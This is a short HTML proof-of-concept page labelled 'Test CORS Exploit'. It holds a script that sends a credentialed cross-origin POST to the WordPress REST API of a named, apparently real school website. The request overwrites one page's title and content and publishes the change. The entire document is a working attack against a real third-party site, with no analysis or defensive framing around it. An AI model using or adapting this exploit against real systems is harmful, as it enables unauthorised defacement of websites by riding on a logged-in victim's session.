<!DOCTYPE html>
<html>
<body>
  <h3>Test CORS Exploit</h3>
  <button onclick="runExploit()">Run Test</button>
  <pre id="output"></pre>

  <script>
    function runExploit() {
      fetch("https://lahanparagon.edu.np/wp-json/wp/v2/pages/271", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          title: "⚠️ CORS Test",
          content: "<h1>This was changed from another domain!</h1>",
          status: "publish"
        })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById('output').textContent = "✅ Success:\n" + JSON.stringify(data, null, 2);
      })
      .catch(err => {
        document.getElementById('output').textContent = "❌ Failed:\n" + err.message;
      });
    }
  </script>
</body>
</html>
